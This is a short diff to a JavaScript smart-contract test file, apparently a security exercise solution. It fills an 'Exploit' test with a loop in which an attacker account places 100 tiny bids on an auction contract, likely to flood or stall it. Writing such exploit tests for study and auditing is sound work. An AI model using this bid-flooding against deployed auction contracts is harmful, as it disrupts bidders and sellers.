@@ -28,7 +28,8 @@ describe('Test Auction', function () {
 
     it('Exploit', async function () {
         for(let i = 0; i < 100; i++) {
-            
+            let amount = BigInt(i);
+            await auction.connect(attacker).bid({value: amount});
         }
     });
 
